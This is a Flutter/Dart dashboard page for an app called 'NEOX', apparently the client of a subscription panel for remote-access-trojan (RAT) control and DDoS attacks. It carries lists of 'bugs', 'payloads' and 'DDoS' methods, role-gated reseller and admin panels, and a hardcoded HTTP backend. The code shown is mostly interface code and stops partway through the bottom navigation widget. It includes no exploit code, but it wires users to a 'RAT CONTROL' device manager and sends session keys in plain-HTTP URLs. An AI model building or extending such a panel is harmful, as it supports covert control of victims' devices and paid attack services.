// ignore_for_file: use_build_context_synchronously
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:video_player/video_player.dart';
import 'package:http/http.dart' as http;
import 'dart:ui';
import 'package:audioplayers/audioplayers.dart';

import 'seller_page.dart';
import 'admin_page.dart';
import 'control_panel.dart';
import 'login_page.dart';

const String baseUrl = "http://kurumi-elainapanel.xtxintax.my.id:2771";

class DashboardPage extends StatefulWidget {
  final String username;
  final String password;
  final String role;
  final String expiredDate;
  final String sessionKey;
  final String uid; // Tambahan UID
  final List<Map<String, dynamic>> listBug;
  final List<Map<String, dynamic>> listPayload;
  final List<Map<String, dynamic>> listDDoS;
  final List<dynamic> news;

  const DashboardPage({
    super.key,
    required this.username,
    required this.password,
    required this.role,
    required this.expiredDate,
    required this.sessionKey,
    required this.uid,
    required this.listBug,
    required this.listPayload,
    required this.listDDoS,
    required this.news,
  });

  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage>
    with SingleTickerProviderStateMixin, WidgetsBindingObserver {
  late AnimationController _controller;
  late Animation<double> _animation;

  VideoPlayerController? _videoController;

  final AudioPlayer _audioPlayer = AudioPlayer();
  final String _backgroundMusicUrl = "https://k.top4top.io/m_375871wig1.m4a";

  late String sessionKey;
  late String username;
  late String password;
  late String role;
  late String expiredDate;
  late String uid; // Simpan UID
  late List<Map<String, dynamic>> listBug;
  late List<Map<String, dynamic>> listPayload;
  late List<Map<String, dynamic>> listDDoS;
  late List<dynamic> newsList;
  String androidId = "unknown";

  Widget _selectedPage = const Placeholder();

  final GlobalKey<ScaffoldState> _scaffoldKey = GlobalKey<ScaffoldState>();

  List<Map<String, dynamic>> _activityLogs = [];
  bool _isLoadingActivityLogs = false;
  bool _hasActivityLogsError = false;

  bool _showBottomNav = true;
  bool _isMusicOn = false;
  String _activePage = 'home';

  // NEON CYBERPUNK PREMIUM THEME
  final Color _primaryColor = const Color(0xFF00FF88);
  final Color _secondaryColor = const Color(0xFF00D4FF);
  final Color _accentColor = const Color(0xFF8844FF);
  final Color _glowColor1 = const Color(0xFF00FF88);
  final Color _glowColor2 = const Color(0xFF00D4FF);
  final Color _glowColor3 = const Color(0xFF8844FF);
  final Color _goldColor = const Color(0xFFFFD700);
  final Color _roseColor = const Color(0xFFFF6B6B);
  final Color _darkBg = const Color(0xFF0A0A1A);
  final Color _darkerBg = const Color(0xFF05050A);
  final Color _surfaceColor = const Color(0xFF12121F);
  final Color _cardColor = const Color(0xFF0E0E18);

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);

    sessionKey = widget.sessionKey;
    username = widget.username;
    password = widget.password;
    role = widget.role;
    expiredDate = widget.expiredDate;
    uid = widget.uid; // Ambil UID dari widget
    listBug = widget.listBug;
    listPayload = widget.listPayload;
    listDDoS = widget.listDDoS;
    newsList = widget.news;

    _controller = AnimationController(
      duration: const Duration(milliseconds: 500),
      vsync: this,
    );
    _animation = CurvedAnimation(parent: _controller, curve: Curves.easeOutCubic);
    _controller.forward();

    _selectedPage = _buildHomePage();

    _initAndroidId();
    _fetchActivityLogs();
    _initVideoBackground();
    _initAudioPlayer();
  }

  Future<void> _initAndroidId() async {
    final deviceInfo = await DeviceInfoPlugin().androidInfo;
    if (mounted) setState(() => androidId = deviceInfo.id);
  }

  Future<void> _fetchActivityLogs() async {
    if (!mounted) return;
    setState(() { _isLoadingActivityLogs = true; _hasActivityLogsError = false; });
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/api/user/getActivityLogs?key=$sessionKey'),
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['valid'] == true && data['logs'] != null) {
          if (mounted) setState(() { _activityLogs = List<Map<String, dynamic>>.from(data['logs']); _isLoadingActivityLogs = false; });
        } else {
          if (mounted) setState(() { _isLoadingActivityLogs = false; _hasActivityLogsError = true; });
        }
      } else {
        if (mounted) setState(() { _isLoadingActivityLogs = false; _hasActivityLogsError = true; });
      }
    } catch (e) {
      if (mounted) setState(() { _isLoadingActivityLogs = false; _hasActivityLogsError = true; });
    }
  }

  void _handleInvalidSession(String message) async {
    await Future.delayed(const Duration(milliseconds: 300));
    final prefs = await SharedPreferences.getInstance();
    await prefs.clear();
    if (!mounted) return;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: _surfaceColor.withOpacity(0.98),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(24),
          side: BorderSide(color: _roseColor.withOpacity(0.4), width: 1),
        ),
        title: Row(children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: _roseColor.withOpacity(0.15),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _roseColor.withOpacity(0.3), width: 1),
            ),
            child: Icon(Icons.warning_amber_rounded, color: _roseColor, size: 22),
          ),
          const SizedBox(width: 14),
          const Text("Session Expired", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w800, fontSize: 16)),
        ]),
        content: Text(message, style: const TextStyle(color: Colors.white60, fontSize: 13)),
        actions: [
          TextButton(
            onPressed: () {
              Navigator.of(context).pushAndRemoveUntil(
                MaterialPageRoute(builder: (_) => const LoginPage()),
                (route) => false,
              );
            },
            child: const Text("OK", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _initAudioPlayer() {
    _audioPlayer.setReleaseMode(ReleaseMode.loop);
  }

  void _toggleBackgroundMusic(bool isPlaying) async {
    setState(() => _isMusicOn = isPlaying);
    if (isPlaying) {
      await _audioPlayer.play(UrlSource(_backgroundMusicUrl), volume: 0.5);
    } else {
      await _audioPlayer.pause();
    }
  }

  Future<void> _initVideoBackground() async {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/animek.mp4');
      await _videoController!.initialize();
      _videoController!.setLooping(true);
      _videoController!.setVolume(0.0);
      await _videoController!.play();
      if (mounted) setState(() {});
    } catch (e) {
      debugPrint("Gagal memuat video background: $e");
    }
  }

  void _selectPage(String page) {
  setState(() {
    _activePage = page;
    if (_scaffoldKey.currentState?.isDrawerOpen == true) {
      Navigator.pop(context);
    }
  });

  Widget nextWidget = _buildHomePage();

  if (page == 'home') {
    nextWidget = _buildHomePage();
  } else if (page == 'rat') {
    // GANTI DARI DeviceDashboardPage MENJADI ControlPanelPage
    nextWidget = const ControlPanelPage(); // Bisa juga kirim device: null
  } else if (page == 'seller') {
    nextWidget = SellerPage(keyToken: sessionKey);
  } else if (page == 'admin') {
    nextWidget = AdminPage(sessionKey: sessionKey);
  }

  setState(() {
    _selectedPage = nextWidget;
    _controller.reset();
    _controller.forward();
  });
}

  void _openSettingsPage() {
    setState(() {
      _activePage = 'settings';
      _selectedPage = _buildSettingsPage();
      _controller.reset();
      _controller.forward();
    });
  }

  void _showAccountMenu() {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => Container(
        margin: const EdgeInsets.all(18),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(28),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
            child: Container(
              padding: const EdgeInsets.all(26),
              decoration: BoxDecoration(
                color: _surfaceColor.withOpacity(0.97),
                border: Border.all(color: _glowColor1.withOpacity(0.15), width: 1),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(width: 50, height: 4,
                    decoration: BoxDecoration(color: Colors.white.withOpacity(0.15), borderRadius: BorderRadius.circular(8))),
                  const SizedBox(height: 24),
                  Container(
                    width: 70, height: 70,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle, color: _cardColor,
                      border: Border.all(color: _glowColor1.withOpacity(0.25), width: 1.5),
                    ),
                    child: Center(
                      child: Text(
                        username.isNotEmpty ? username[0].toUpperCase() : "U",
                        style: TextStyle(color: _glowColor1, fontSize: 32, fontWeight: FontWeight.w800),
                      ),
                    ),
                  ),
                  const SizedBox(height: 14),
                  Text("PROFILE", style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 18, fontWeight: FontWeight.w800)),
                  const SizedBox(height: 24),
                  _buildInfoRow(Icons.person, "USERNAME", username),
                  const SizedBox(height: 10),
                  _buildInfoRow(Icons.calendar_today, "EXPIRES", expiredDate),
                  const SizedBox(height: 10),
                  _buildInfoRow(Icons.security, "ROLE", role),
                  const SizedBox(height: 10),
                  _buildInfoRow(Icons.fingerprint, "UID", uid), // Tampilkan UID
                  const SizedBox(height: 24),
                  Row(children: [
                    Expanded(child: _buildMenuButton(
                      icon: Icons.logout, label: "LOGOUT",
                      onTap: () async {
                        final prefs = await SharedPreferences.getInstance();
                        await prefs.clear();
                        if (!mounted) return;
                        Navigator.of(context).pushAndRemoveUntil(
                          MaterialPageRoute(builder: (_) => const LoginPage()), (route) => false);
                      },
                      color: _roseColor,
                    )),
                  ]),
                  const SizedBox(height: 16),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildInfoRow(IconData icon, String label, String value) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        color: _cardColor, borderRadius: BorderRadius.circular(14),
        border: Border.all(color: Colors.white.withOpacity(0.06), width: 1),
      ),
      child: Row(children: [
        Icon(icon, color: _glowColor1.withOpacity(0.5), size: 18),
        const SizedBox(width: 12),
        Text(label, style: TextStyle(color: Colors.white.withOpacity(0.4), fontWeight: FontWeight.w700, fontSize: 12)),
        const Spacer(),
        Text(value, style: const TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.w600)),
      ]),
    );
  }

  Widget _buildMenuButton({required IconData icon, required String label, required VoidCallback onTap, required Color color}) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: color.withOpacity(0.1),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: color.withOpacity(0.25), width: 1),
        ),
        child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
          Icon(icon, color: color.withOpacity(0.8), size: 18),
          const SizedBox(width: 8),
          Text(label, style: TextStyle(color: color.withOpacity(0.9), fontWeight: FontWeight.w800, fontSize: 12)),
        ]),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: EdgeInsets.only(
        top: MediaQuery.of(context).padding.top + 10,
        bottom: 10,
        left: 18,
        right: 18,
      ),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [_darkerBg.withOpacity(0.97), Colors.transparent],
        ),
      ),
      child: Row(
        children: [
          _buildHeaderBtn(
            icon: Icons.menu_rounded,
            onTap: () => _scaffoldKey.currentState?.openDrawer(),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text("NEOX",
                  style: TextStyle(color: _glowColor1, fontSize: 22, fontWeight: FontWeight.w900, letterSpacing: 6)),
                Text("DASHBOARD",
                  style: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 8, letterSpacing: 4, fontWeight: FontWeight.w700)),
              ],
            ),
          ),
          _buildHeaderBtn(icon: Icons.person_outline, onTap: _showAccountMenu),
          const SizedBox(width: 10),
          _buildHeaderBtn(
            icon: Icons.settings_outlined,
            onTap: _openSettingsPage,
            isActive: _activePage == 'settings',
          ),
        ],
      ),
    );
  }

  Widget _buildHeaderBtn({required IconData icon, required VoidCallback onTap, bool isActive = false}) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: 44, height: 44,
        decoration: BoxDecoration(
          color: isActive ? _glowColor1.withOpacity(0.12) : _cardColor,
          borderRadius: BorderRadius.circular(13),
          border: Border.all(color: isActive ? _glowColor1.withOpacity(0.4) : Colors.white.withOpacity(0.07), width: 1),
        ),
        child: Icon(icon, color: isActive ? _glowColor1 : Colors.white.withOpacity(0.6), size: 20),
      ),
    );
  }

  Widget _buildAccountStatsCard() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 18),
      child: Container(
        padding: const EdgeInsets.all(24),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [_cardColor, _cardColor.withOpacity(0.5)],
          ),
          borderRadius: BorderRadius.circular(24),
          border: Border.all(color: _glowColor1.withOpacity(0.15), width: 1),
          boxShadow: [
            BoxShadow(color: _glowColor1.withOpacity(0.1), blurRadius: 20, offset: const Offset(0, 10)),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  width: 65, height: 65,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    gradient: LinearGradient(colors: [_glowColor1, _glowColor2]),
                    border: Border.all(color: _glowColor1.withOpacity(0.3), width: 1.5),
                  ),
                  child: Center(
                    child: Text(
                      username.isNotEmpty ? username[0].toUpperCase() : "U",
                      style: const TextStyle(color: Colors.black, fontSize: 28, fontWeight: FontWeight.w800),
                    ),
                  ),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text("WELCOME BACK", style: TextStyle(color: _glowColor2.withOpacity(0.6), fontSize: 10, letterSpacing: 2)),
                      const SizedBox(height: 4),
                      Text(username, style: const TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.w800)),
                      const SizedBox(height: 8),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                        decoration: BoxDecoration(
                          color: _goldColor.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(color: _goldColor.withOpacity(0.3), width: 1),
                        ),
                        child: Text(role.toUpperCase(), style: TextStyle(color: _goldColor.withOpacity(0.9), fontSize: 9, fontWeight: FontWeight.w800)),
                      ),
                    ],
                  ),
                ),
              ],
            ),
            const SizedBox(height: 20),
            Container(
              padding: const EdgeInsets.symmetric(vertical: 10),
              decoration: BoxDecoration(color: _surfaceColor, borderRadius: BorderRadius.circular(12)),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.calendar_today, color: _glowColor1.withOpacity(0.5), size: 14),
                  const SizedBox(width: 8),
                  Text("Expires: $expiredDate", style: TextStyle(color: _glowColor1.withOpacity(0.7), fontSize: 11, fontWeight: FontWeight.w700)),
                ],
              ),
            ),
            const SizedBox(height: 16),
            Divider(color: Colors.white.withOpacity(0.06), height: 1),
            const SizedBox(height: 14),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Row(children: [
                  Text("UID: $uid", style: TextStyle(color: Colors.white.withOpacity(0.35), fontSize: 10)),
                  const SizedBox(width: 8),
                  GestureDetector(
                    onTap: () {
                      Clipboard.setData(ClipboardData(text: uid));
                      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                        content: const Text('UID Copied!'),
                        backgroundColor: _surfaceColor,
                        duration: const Duration(seconds: 1),
                      ));
                    },
                    child: Icon(Icons.copy, color: Colors.white.withOpacity(0.3), size: 13),
                  ),
                ]),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildQuickActions() {
    final String currentRole = role.toLowerCase();
    final bool canAccessAdmin = ['founder', 'moderator', 'high admin', 'owner', 'admin'].contains(currentRole);
    final bool canAccessSeller = ['founder', 'moderator', 'high admin', 'owner', 'reseller', 'admin'].contains(currentRole);

    final List<Map<String, dynamic>> quickActions = [];

    if (canAccessSeller) {
      quickActions.add({
        "title": "SELLER PANEL", "subtitle": "Manage resellers",
        "icon": Icons.store, "color": _glowColor3,
        "onTap": () => _selectPage('seller')
      });
    }

    if (canAccessAdmin) {
      quickActions.add({
        "title": "ADMIN PANEL", "subtitle": "System settings",
        "icon": Icons.admin_panel_settings, "color": _goldColor,
        "onTap": () => _selectPage('admin')
      });
    }

    quickActions.add({
      "title": "RAT CONTROL", "subtitle": "Device manager",
      "icon": Icons.phone_android, "color": _glowColor1,
      "onTap": () => _selectPage('rat')
    });

    if (quickActions.isEmpty) return const SizedBox.shrink();

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 18),
          child: _buildSectionHeader(Icons.bolt, "QUICK ACCESS"),
        ),
        const SizedBox(height: 18),
        SizedBox(
          height: 180,
          child: ListView.builder(
            scrollDirection: Axis.horizontal,
            padding: const EdgeInsets.symmetric(horizontal: 14),
            itemCount: quickActions.length,
            itemBuilder: (context, index) => _buildActionCard(quickActions[index]),
          ),
        ),
      ],
    );
  }

  Widget _buildActionCard(Map<String, dynamic> action) {
    final Color color = action['color'] as Color;
    return GestureDetector(
      onTap: action['onTap'],
      child: Container(
        width: 240,
        margin: const EdgeInsets.only(right: 12),
        padding: const EdgeInsets.all(22),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [_cardColor, _cardColor.withOpacity(0.5)],
          ),
          borderRadius: BorderRadius.circular(22),
          border: Border.all(color: color.withOpacity(0.2), width: 1),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: color.withOpacity(0.1),
                borderRadius: BorderRadius.circular(14),
              ),
              child: Icon(action['icon'], color: color.withOpacity(0.85), size: 24),
            ),
            const Spacer(),
            Text(action['title'], style: const TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.w800)),
            const SizedBox(height: 4),
            Text(action['subtitle'], style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 11)),
          ],
        ),
      ),
    );
  }

  Widget _buildHomePage() {
    return Container(
      color: _darkerBg,
      child: RefreshIndicator(
        color: _glowColor1,
        backgroundColor: _surfaceColor,
        onRefresh: () async {
          await _fetchActivityLogs();
          await Future.delayed(const Duration(seconds: 1));
          setState(() {});
        },
        child: CustomScrollView(
          physics: const AlwaysScrollableScrollPhysics(),
          slivers: [
            SliverToBoxAdapter(child: SizedBox(height: MediaQuery.of(context).padding.top + 80)),
            SliverToBoxAdapter(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const SizedBox(height: 8),
                  _buildAccountStatsCard(),
                  const SizedBox(height: 32),
                  _buildQuickActions(),
                  const SizedBox(height: 32),
                  _buildRecentActivity(),
                  const SizedBox(height: 120),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSectionHeader(IconData icon, String title) {
    return Row(
      children: [
        Container(width: 3, height: 18,
          decoration: BoxDecoration(gradient: LinearGradient(colors: [_glowColor1, _glowColor2]), borderRadius: BorderRadius.circular(2))),
        const SizedBox(width: 10),
        Icon(icon, color: _glowColor1.withOpacity(0.6), size: 16),
        const SizedBox(width: 8),
        Text(title, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w800, letterSpacing: 3)),
      ],
    );
  }

  Widget _buildRecentActivity() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 18),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildSectionHeader(Icons.history, "ACTIVITY LOG"),
          const SizedBox(height: 18),
          if (_isLoadingActivityLogs)
            Container(
              height: 120,
              decoration: BoxDecoration(color: _cardColor, borderRadius: BorderRadius.circular(18)),
              child: const Center(child: CircularProgressIndicator()),
            )
          else if (_hasActivityLogsError)
            Container(
              height: 120,
              decoration: BoxDecoration(color: _cardColor, borderRadius: BorderRadius.circular(18)),
              child: Center(child: Text("Failed to load logs", style: TextStyle(color: Colors.white.withOpacity(0.4)))),
            )
          else if (_activityLogs.isEmpty)
            Container(
              height: 120,
              decoration: BoxDecoration(color: _cardColor, borderRadius: BorderRadius.circular(18)),
              child: Center(child: Text("No activity logs", style: TextStyle(color: Colors.white.withOpacity(0.3)))),
            )
          else
            ..._activityLogs.take(5).map((log) {
              final timestamp = DateTime.tryParse(log['timestamp'] ?? '') ?? DateTime.now();
              final formattedTime = _formatDateTime(timestamp);
              String activityText = log['activity'] ?? 'Unknown Activity';
              return Container(
                margin: const EdgeInsets.only(bottom: 12),
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                    colors: [_cardColor, _cardColor.withOpacity(0.5)],
                  ),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: Colors.white.withOpacity(0.06), width: 1),
                ),
                child: Row(children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: _glowColor1.withOpacity(0.08),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Icon(Icons.notifications, color: _glowColor1.withOpacity(0.6), size: 18),
                  ),
                  const SizedBox(width: 14),
                  Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text(activityText, style: const TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.w600)),
                    const SizedBox(height: 4),
                    Text(formattedTime, style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 10)),
                  ])),
                  Icon(Icons.chevron_right, color: Colors.white.withOpacity(0.2), size: 18),
                ]),
              );
            }).toList(),
        ],
      ),
    );
  }

  String _formatDateTime(DateTime dateTime) {
    final diff = DateTime.now().difference(dateTime);
    if (diff.inDays > 0) return '${diff.inDays}d ago';
    if (diff.inHours > 0) return '${diff.inHours}h ago';
    if (diff.inMinutes > 0) return '${diff.inMinutes}m ago';
    return 'Just now';
  }

  Widget _buildSettingsPage() {
    return Container(
      color: _darkerBg,
      child: SafeArea(
        child: CustomScrollView(
          physics: const BouncingScrollPhysics(),
          slivers: [
            SliverToBoxAdapter(
              child: Padding(
                padding: const EdgeInsets.fromLTRB(22, 24, 22, 0),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Container(width: 4, height: 22,
                          decoration: BoxDecoration(gradient: LinearGradient(colors: [_glowColor1, _glowColor2]), borderRadius: BorderRadius.circular(2))),
                        const SizedBox(width: 12),
                        Text("PREFERENCES", style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 20, fontWeight: FontWeight.w800)),
                      ],
                    ),
                    const SizedBox(height: 32),
                    _buildSettingCard(
                      icon: Icons.navigation_outlined, title: "NAVIGATION BAR",
                      subtitle: "Show/Hide bottom navigation menu", value: _showBottomNav,
                      onChanged: (val) { setState(() => _showBottomNav = val); _openSettingsPage(); },
                    ),
                    const SizedBox(height: 14),
                    _buildSettingCard(
                      icon: _isMusicOn ? Icons.music_note : Icons.music_off,
                      title: "BACKGROUND MUSIC", subtitle: "Play online ambient music",
                      value: _isMusicOn,
                      onChanged: (val) { _toggleBackgroundMusic(val); _openSettingsPage(); },
                    ),
                    const SizedBox(height: 44),
                    GestureDetector(
                      onTap: () => _selectPage('home'),
                      child: Container(
                        width: double.infinity,
                        height: 54,
                        decoration: BoxDecoration(
                          gradient: LinearGradient(colors: [_glowColor1, _glowColor2]),
                          borderRadius: BorderRadius.circular(14),
                          boxShadow: [
                            BoxShadow(color: _glowColor1.withOpacity(0.3), blurRadius: 20),
                          ],
                        ),
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(Icons.arrow_back, color: _darkerBg, size: 18),
                            const SizedBox(width: 12),
                            Text("BACK TO HOME", style: TextStyle(color: _darkerBg, fontWeight: FontWeight.w900, fontSize: 13, letterSpacing: 4)),
                          ],
                        ),
                      ),
                    ),
                    const SizedBox(height: 50),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSettingCard({
    required IconData icon, required String title, required String subtitle,
    required bool value, required Function(bool) onChanged,
  }) {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [_cardColor, _cardColor.withOpacity(0.5)],
        ),
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _glowColor1.withOpacity(value ? 0.25 : 0.08), width: 1),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: _glowColor1.withOpacity(0.1),
              borderRadius: BorderRadius.circular(14),
            ),
            child: Icon(icon, color: _glowColor1.withOpacity(0.8), size: 22),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title, style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w800)),
                const SizedBox(height: 4),
                Text(subtitle, style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 10)),
              ],
            ),
          ),
          Switch(
            value: value,
            activeColor: _darkerBg,
            activeTrackColor: _glowColor1,
            inactiveThumbColor: Colors.grey.shade700,
            inactiveTrackColor: Colors.white.withOpacity(0.08),
            onChanged: onChanged,
          ),
        ],
      ),
    );
  }

  // ─────────────────────────── SIDEBAR (DRAWER) ─────────────────────
  Widget _buildSidebar() {
    final String currentRole = role.toLowerCase();
    final bool canAccessAdmin = ['founder', 'moderator', 'high admin', 'owner', 'admin'].contains(currentRole);
    final bool canAccessSeller = ['founder', 'moderator', 'high admin', 'owner', 'reseller', 'admin'].contains(currentRole);

    return Container(
      width: 280,
      decoration: BoxDecoration(
        color: _surfaceColor.withOpacity(0.98),
        boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 20)],
      ),
      child: SafeArea(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const SizedBox(height: 24),
            // Sidebar Header
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20),
              child: Row(
                children: [
                  Container(
                    width: 48, height: 48,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: LinearGradient(colors: [_glowColor1, _glowColor2]),
                    ),
                    child: Center(
                      child: Text(
                        username.isNotEmpty ? username[0].toUpperCase() : "U",
                        style: const TextStyle(color: Colors.black, fontSize: 22, fontWeight: FontWeight.w800),
                      ),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(username, style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.w800)),
                        Text(role, style: TextStyle(color: _goldColor.withOpacity(0.7), fontSize: 10)),
                      ],
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 24),
            Divider(color: Colors.white.withOpacity(0.08), thickness: 1),
            const SizedBox(height: 16),
            // Menu Items
            _buildSidebarItem(Icons.home, "HOME", 'home'),
            _buildSidebarItem(Icons.phone_android, "RAT CONTROL", 'rat'),
            if (canAccessSeller) _buildSidebarItem(Icons.store, "SELLER PANEL", 'seller'),
            if (canAccessAdmin) _buildSidebarItem(Icons.admin_panel_settings, "ADMIN PANEL", 'admin'),
            const Spacer(),
            Divider(color: Colors.white.withOpacity(0.08), thickness: 1),
            const SizedBox(height: 16),
            _buildSidebarItem(Icons.settings, "SETTINGS", 'settings'),
            _buildSidebarItem(Icons.logout, "LOGOUT", 'logout'),
            const SizedBox(height: 24),
          ],
        ),
      ),
    );
  }

  Widget _buildSidebarItem(IconData icon, String title, String page) {
    bool isActive = _activePage == page;
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: () {
          if (page == 'logout') {
            _showAccountMenu();
          } else if (page == 'settings') {
            _openSettingsPage();
          } else {
            _selectPage(page);
          }
        },
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
          margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
          decoration: isActive
              ? BoxDecoration(
                  gradient: LinearGradient(colors: [_glowColor1.withOpacity(0.1), _glowColor2.withOpacity(0.05)]),
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                )
              : null,
          child: Row(
            children: [
              Icon(icon, color: isActive ? _glowColor1 : Colors.white.withOpacity(0.45), size: 20),
              const SizedBox(width: 14),
              Text(title, style: TextStyle(
                color: isActive ? _glowColor1 : Colors.white.withOpacity(0.75),
                fontSize: 14, fontWeight: isActive ? FontWeight.w800 : FontWeight.w600)),
              if (isActive)
                const Spacer(),
              if (isActive)
                Container(width: 6, height: 6,
                  decoration: BoxDecoration(color: _glowColor1, shape: BoxShape.circle)),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildBottomNavBar() {
    final String currentRole = role.toLowerCase();
    final bool canAccessAdmin = ['founder', 'moderator', 'high admin', 'owner', 'admin'].contains(currentRole);
    final bool canAccessSeller = ['founder', 'moderator', 'high admin', 'owner', 'reseller', 'admin'].contains(currentRole);

    List<Map<String, dynamic>> navItems = [
      {"icon": Icons.home_filled, "label": "HOME", "page": "home"},
      {"icon": Icons.phone_android, "label": "RAT", "page": "rat"},
    ];

    if (canAccessSeller) {
      navItems.add({"icon": Icons.store, "label": "SELLER", "page": "seller"});
    }
    if (canAccessAdmin) {
      navItems.add({"icon": Icons.admin_panel_settings, "label": "ADMIN", "page": "admin"});
    }

    return Positioned(
      bottom: 16, left: 16, right: 16,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 6, horizontal: 10),
        decoration: BoxDecoration(
          color: _surfaceColor.withOpacity(0.96),
          borderRadius: BorderRadius.circular(22),
